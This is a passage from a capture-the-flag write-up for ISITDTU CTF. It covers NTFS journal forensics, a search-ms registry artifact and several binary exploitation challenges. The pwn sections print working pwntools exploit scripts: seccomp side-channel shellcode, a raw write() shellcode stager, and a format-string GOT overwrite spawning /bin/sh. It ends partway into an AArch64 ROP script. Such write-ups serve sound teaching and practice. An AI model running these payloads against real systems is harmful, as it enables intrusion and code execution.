<p><img src="https://hackmd.io/_uploads/Bkc2xOne1e.png" alt="image"></p>
<p>We&rsquo;ll take the Created Time and convert it to UTC, resulting in: <code>2024-10-22 21:51:13</code>.</p>
<blockquote>
<p>Q4. How much time did that file take to for download (in seconds)??</p></blockquote>
<p>For this question, I know that during a download, a temporary file like <code>.crdownload</code> is created. We can parse both <code>$LogFile</code> and <code>$UsnJrnl</code> to trace this process. In this challenge, I opted to use <code>$LogFile</code>.</p>
<p>Upon inspection, I noticed a discrepancy in the timestamps, which likely provides the answer.</p>
<p><img src="https://hackmd.io/_uploads/rkBSZdneye.png" alt="image"></p>
<p>(I ended up brute-forcing the timestamp since locating the exact column became tedious) &ndash;&gt; Answer: <code>126</code></p>
<blockquote>
<p>Q5. The first directory he moved this file to?</p></blockquote>
<p>In this challenge, I used the remove method, knowing that the <code>MustRead</code> folder is a carved folder, which indicates it was likely deleted. This left me with two options: <code>best</code> and <code>secret</code>. I tried both and found the answer to be: <code>best</code></p>
<blockquote>
<p>Q6. Last directory the suspicious move the file to?</p></blockquote>
<p>As mentioned, the final directory where we located the PDF file is the <code>MustRead</code> folder — making <code>MustRead</code> the answer.</p>
<blockquote>
<p>Q7. The time he of the deletion??</p></blockquote>
<p>I used <code>$UsnJrnl</code> because this file logs creation, deletion, and modification activities for files and directories, making it a valuable source of information.</p>
<p>Tool used: <a href="https://github.com/jschicht/UsnJrnl2Csv">UsnJrnl2Csv</a></p>
<p>To parse the file, we utilized the search shortcut for efficient findings.</p>
<p><img src="https://hackmd.io/_uploads/HkopGdnlke.png" alt="image"></p>
<p>Answer: <code>2024-10-22 22:20:28</code></p>
<p><img src="https://hackmd.io/_uploads/SJgbN0yWyx.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{https://www.youtube.com/watch?v=yqp61_Wqm-A}
</span></span></code></pre></div><h3 id="initial">
<a class="header-anchor" href="#initial"></a>
Initial
</h3><p>To be honest, this challenge is much simpler that I have expected. Let&rsquo;s have a look at the challenge description:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Description: A Windows environment has been compromised .The attacker used a known feature in windows which served as the initial vector of the attack. Your task is to investigate &amp; SEARCH how the attacker get the initial access.
</span></span></code></pre></div><p>Some key information:</p>
<ul>
<li>Attacker use SEARCH feature of Windows (probably in Explorer)</li>
<li>We are given a dump of registry, and the data leading to flag should be inside.</li>
</ul>
<p>Since this is a special artifacts that are not mentioning much, I have to perform a Google search and this is what I found:
<img src="https://hackmd.io/_uploads/S1JOxpyZ1x.png" alt="image"></p>
<p>The 2nd post mentions that:
<img src="https://hackmd.io/_uploads/HkBql6J-ke.png" alt="image"></p>
<p>Searching that registry key returns:
<img src="https://hackmd.io/_uploads/SkVPZ61bkg.png" alt="image"></p>
<p>I will decode using CyberChef:
<img src="https://hackmd.io/_uploads/rJVOW6kbJg.png" alt="image"></p>
<p>Flag: <code>ISITDTU{N0w_I_kn0w_about_search-ms}</code></p>
<h2 id="pwn">
<a class="header-anchor" href="#pwn"></a>
PWN
</h2><h3 id="shellcode-1">
<a class="header-anchor" href="#shellcode-1"></a>
shellcode 1
</h3><p><img src="https://hackmd.io/_uploads/rJaT05ilJl.png" alt="image"></p>
<h4 id="reverse">
<a class="header-anchor" href="#reverse"></a>
Reverse
</h4><p><img src="https://hackmd.io/_uploads/rJzzxhjgJe.png" alt="image"></p>
<p>The flow is pretty straight-forward:</p>
<ul>
<li>read flag and save it in memory</li>
<li><code>mmap</code> a rwx address space</li>
<li>allow us write shellcode on it</li>
<li>filter syscall with <code>seccomp</code>
<ul>
<li>no open, read, write, execve</li>
</ul>
</li>
</ul>
<h4 id="exploit">
<a class="header-anchor" href="#exploit"></a>
Exploit
</h4><p>So I just use side-channel attack, to bruteforce the flag</p>
<h4 id="script">
<a class="header-anchor" href="#script"></a>
Script
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./challenge&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;challenge&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">b *main+344
</span></span></span><span class="line"><span class="cl"><span class="s1">b *main+374
</span></span></span><span class="line"><span class="cl"><span class="s1">continue
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;152.69.210.130&#34;</span><span class="p">,</span> <span class="mi">3001</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># r = process(exe)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># r = gdb.debug(exe, gdbscript=gdbscript)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># pwningggg</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">tryChar</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Connect to the service</span>
</span></span><span class="line"><span class="cl">    <span class="n">connect</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Some gift for you:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Default is to exit</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;xor eax, eax</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;mov edi, 0</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="c1"># Read from stdin, effectively holding the connection open</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;add rdx, 0x1000</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Load up 64-bits at a time</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;mov rbx, [rdx + </span><span class="si">{0}</span><span class="s2">*8]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">index</span><span class="o">//</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Shift over to the char we&#39;re actually comparing against</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;shr rbx, </span><span class="si">{0}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">(</span><span class="n">index</span><span class="o">%</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># perform loop</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;loop:&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Perform the comparison with our guess</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;cmp bl, </span><span class="si">{0}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Conditionally return if we guessed wrong</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;je loop</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;ret</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Sometimes we ended up with newline chars, just ask pwntools to remove them</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Send it</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Try reading</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Connection closed on us, wrong guess</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Connection stayed open, correct guess</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;ISITDTU{&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Not specifying stop here since we don&#39;t know how long the flag is</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Guess every character</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Trying char: </span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># If we found this char, break and move to the next</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tryChar</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Found char: &#34;</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># If we hit this, we&#39;re probably done reading the flag</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># tryChar(&#39;q&#39;, len(flag))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag: &#34;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p><img src="https://hackmd.io/_uploads/rk4A1aslyl.png" alt="image"></p>
<h3 id="shellcode-2">
<a class="header-anchor" href="#shellcode-2"></a>
shellcode 2
</h3><p><img src="https://hackmd.io/_uploads/HytVJjigJg.png" alt="image">
<img src="https://hackmd.io/_uploads/BkJPB3seyx.png" alt="image">
<img src="https://hackmd.io/_uploads/B1swShjlJe.png" alt="image">
<img src="https://hackmd.io/_uploads/BkPdBhsgkg.png" alt="image"></p>
<p>The code (for loop) at line 18 (main) is checking whether each byte of input (shellcode) that we give is an odd byte or not. If its even, it will be replaced with 0x90 (nop)
Lets look at assembly code
<img src="https://hackmd.io/_uploads/rkwUL3oxke.png" alt="image">
We will set a breakpoint here to check the values of the registers.
<img src="https://hackmd.io/_uploads/SJl6U3ogJl.png" alt="image">
I will focus on 4 registers:
&rsquo;&rsquo;&rsquo;
rax = 0
rdi = 0
rsi = 0xaabbc000 (address of shellcode)
rdx = 0xaabbc000 (address of shellcode)
&rsquo;&rsquo;&rsquo;
Great, that mean we can call read (syscall) to read to address 0xaabbc000 our &ldquo;real&rdquo; shellcode because there is no filter here :)). Just input 2 bytes</p>
<p><img src="https://hackmd.io/_uploads/r1RUP3ieJg.png" alt="image">
<img src="https://hackmd.io/_uploads/Hk1KDhseyl.png" alt="image"></p>
<p>Note that when &ldquo;call rdx&rdquo;, it pushes the return address onto the stack, that is <em>0x00005555555553ff</em>
<img src="https://hackmd.io/_uploads/SJXPO3slJx.png" alt="image">
<img src="https://hackmd.io/_uploads/SJ1Md3sg1g.png" alt="image">
The flag is at 0x555555558040
<img src="https://hackmd.io/_uploads/BkGTu2ilye.png" alt="image">
The offset from &ldquo;return address&rdquo; and &ldquo;flag&rdquo; is <em>0x2c41</em>
My goal is to do write(1, buf, 0x100) so my new shellcode will be</p>
<p><img src="https://hackmd.io/_uploads/Bk3_Y2oeyl.png" alt="image"></p>
<p>Script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
</span></span><span class="line"><span class="cl">e = context.binary = ELF(&#39;challenge_patched&#39;)
</span></span><span class="line"><span class="cl">if args.LOCAL:
</span></span><span class="line"><span class="cl">	#r = process(&#34;./challenge_patched&#34;)
</span></span><span class="line"><span class="cl">	if 1:
</span></span><span class="line"><span class="cl">		r = gdb.debug(&#34;./challenge_patched&#34;)
</span></span><span class="line"><span class="cl">else:
</span></span><span class="line"><span class="cl">	r = remote(&#34;152.69.210.130&#34;, 3002)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">shellcode = b&#34;\x0f\x05&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">r.sendlineafter(b&#34;&gt;\n&#34;, shellcode)
</span></span><span class="line"><span class="cl">#r.sendline(b&#34;cat flag.txt&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">new_shellcode = b&#34;A&#34;*2 + b&#34;\x48\x8B\x34\x24\x48\x81\xC6\x41\x2C\x00\x00\x48\x31\xC0\x48\xFF\xC0\x48\x31\xFF\x48\xFF\xC7\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05&#34;
</span></span><span class="line"><span class="cl">sleep(1)
</span></span><span class="line"><span class="cl">r.sendline(new_shellcode)
</span></span><span class="line"><span class="cl">r.interactive()
</span></span></code></pre></div><p>Result:
<img src="https://hackmd.io/_uploads/r1De5hie1e.png" alt="image"></p>
<h3 id="game-of-luck">
<a class="header-anchor" href="#game-of-luck"></a>
Game of Luck
</h3><p><img src="https://hackmd.io/_uploads/Sy8rJsog1x.png" alt="image">
<img src="https://hackmd.io/_uploads/SJFU9njg1e.png" alt="image">
<img src="https://hackmd.io/_uploads/rktPqnjg1g.png" alt="image">
<img src="https://hackmd.io/_uploads/SJhOo2jlyg.png" alt="image"></p>
<p>I will focus on 2 functions (sub_40140E() and sub_4015B6())
<img src="https://hackmd.io/_uploads/HJhsqhoeJg.png" alt="image">
Generate a random number v1 &gt;=0 and &lt;100 (at rbp-0xC =&gt; Important!!) and print out (Lucky number)</p>
<p>Then in the main function, it will call the sub_4015B6 function.
<img src="https://hackmd.io/_uploads/SJxUihjeyl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1iconjxJe.png" alt="image">
We will take a look at the play_401480() function.
<img src="https://hackmd.io/_uploads/rkLRi3jxJl.png" alt="image">
In play_401480(), it will re-seed (by calling clock()) and ask us to guess what v2 is (v2 is the number generated from rand()). We input the guessed number via the sub_4013BB() function (read and atoi)
<img src="https://hackmd.io/_uploads/r1S13higye.png" alt="image">
If the guess is correct it will call the format_vuln_401534() function (format string!!!)
<img src="https://hackmd.io/_uploads/B1w1pholyl.png" alt="image"></p>
<p>The problem here is, it is difficult to guess the seed (clock) in just one guess. If we guess wrong, the program will exit immediately.</p>
<p>Here we go&hellip;
At line 13 in sub_4015B6(), scanf limits the input to a maximum of one character. This means that only a single digit (0-9) will be read and converted into an unsigned integer.
<img src="https://hackmd.io/_uploads/rytUR2ixkx.png" alt="image">
So we cannot just input 0x44 (=choice) to call the function format_vuln_401534().
Try debugging and set a breakpoint right there
Run the program a few times and see that the value of choice before scanf is not the same.
<img src="https://hackmd.io/_uploads/rkg6l1psgkg.png" alt="image">
<img src="https://hackmd.io/_uploads/ByrbkpoeJl.png" alt="image">
Why?
<img src="https://hackmd.io/_uploads/BJZHkTjekg.png" alt="image">
&ldquo;choice&rdquo; is at rbp-0xC&hellip; Our lucky number is also at rbp-0xC.
Reason:
<img src="https://hackmd.io/_uploads/BkQg-pjxJg.png" alt="image">
So, if lucky number is 0x44, and we input &ldquo;-&rdquo; when entering choice. The choice is still 0x44!! (scanf will not change the value of 0x44 if we enter &ldquo;-&rdquo;). The probability is 1/100 :)).</p>
<p>What do we do next
<img src="https://hackmd.io/_uploads/Syzo-6ogyg.png" alt="image">
We can use format string bug (input &ldquo;-&rdquo;) multiple times. First, leak GOT to get the address of libc and use libc.rip to find the libc version. Then, overwrite atoi@got to the address of the system. Finally, enter &ldquo;1&rdquo; to enter the play_401480() function. In the play_401480() function, it will call the sub_4013BB() function.
<img src="https://hackmd.io/_uploads/Sk7izTolJx.png" alt="image">
In read, we enter &ldquo;/bin/sh\x00&rdquo;. Then atoi(buf) will be equivalent to system(buf) =&gt; system(&quot;/bin/sh&quot;)</p>
<p><img src="https://hackmd.io/_uploads/rk8Vmpil1e.png" alt="image"></p>
<p>Script</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">ctypes</span> <span class="n">import</span> <span class="n">CDLL</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chal_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="c1">#r = process(elf.path)</span>
</span></span><span class="line"><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;152.69.210.130&#34;</span><span class="p">,</span> <span class="mi">2004</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2. Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">test</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">test</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Enter&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;%7$s&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;your name: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] leak: &#34;</span><span class="p">,</span> <span class="n">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_addr</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x606f0</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x50d70</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#### overwrite got</span>
</span></span><span class="line"><span class="cl"><span class="n">fmt_payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span> <span class="p">:</span> <span class="n">system</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2. Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;your name: &#34;</span><span class="p">,</span> <span class="n">fmt_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2. Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter your guess: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="no_name">
<a class="header-anchor" href="#no_name"></a>
no_name
</h3><p><img src="https://hackmd.io/_uploads/Sk-Uysjxke.png" alt="image"></p>
<h4 id="reverse-1">
<a class="header-anchor" href="#reverse-1"></a>
Reverse
</h4><p><img src="https://hackmd.io/_uploads/rk8_bhiekx.png" alt="image"></p>
<p>What can be better than an AARCH64 challenge, obviously the stripped one :ok_hand:</p>
<p>At first I struggled with the debugging step, and also the custom qemu that this challenge use.</p>
<p>The flow of this program:</p>
<ul>
<li>
<p><code>main</code></p>
<ul>
<li>just call <code>vuln1()</code></li>
</ul>
</li>
<li>
<p><code>sub_D7C()</code> a.k.a <code>vuln1()</code></p>
<ul>
<li>a simple race condition vuln</li>
<li>if success will call <code>vuln2()</code></li>
</ul>
</li>
<li>
<p><code>sub_C64()</code> a.k.a <code>vuln2()</code></p>
<ul>
<li>give us <code>read</code> reading data to buf</li>
<li>then <code>printf(buf)</code> that allow format string bug</li>
<li>it allows us do this 2 times then return</li>
</ul>
</li>
<li>
<p><code>sub_BD4()</code> a.k.a <code>vuln3()</code></p>
<ul>
<li>a hidden function</li>
<li>allow us to overflow buf</li>
</ul>
</li>
</ul>
<h4 id="exploit-1">
<a class="header-anchor" href="#exploit-1"></a>
Exploit
</h4><ol>
<li>
<p><code>vuln1()</code></p>
<ul>
<li>bypass with race condition</li>
</ul>
</li>
<li>
<p>1st <code>vuln2()</code></p>
<ul>
<li>we use the first printf to leak pie, stack, libc and canary</li>
<li>the second printf I will use to overwrite <code>vuln2()</code> to the return address of <code>vuln1()</code> (previouly is <code>*main+24</code>), now we will have infinite loop to <code>vuln2()</code></li>
<li>The flow will become <code>vuln2()</code> -&gt; <code>*vuln1+296</code> -&gt; <code>vuln2()</code> -&gt; <code>vuln2()</code> -&gt; <code>vuln2()</code> -&gt; &hellip;</li>
</ul>
</li>
<li>
<p>2nd and 3rd <code>vuln2()</code></p>
<ul>
<li>If we just directly move to <code>vuln3()</code> we will never escape infinite loop because the return address in stack frame is lower than buf -&gt; cannot overflow</li>
<li>So instead of jumping to start of <code>vuln3()</code> as this instruction <code>STP    X29, X30, [SP,#var_30]!</code> will extend the stack and cause the infinite loop</li>
<li>I will jump to to the the middle of <code>vuln3()</code> where it call read()</li>
<li>But this will have SIGSEGV fault when <code>vuln3()</code> return as the stack is corrupt</li>
<li>So I will use the FSB in <code>vuln2()</code> to patch the address in stack</li>
</ul>
</li>
<li>
<p><code>vuln3()</code></p>
<ul>
<li>We have all we need now, just perform a simple AARCH64-ROP</li>
</ul>
</li>
</ol>
<h4 id="script-1">
<a class="header-anchor" href="#script-1"></a>
Script
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">ctypes</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">time</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./chall&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	
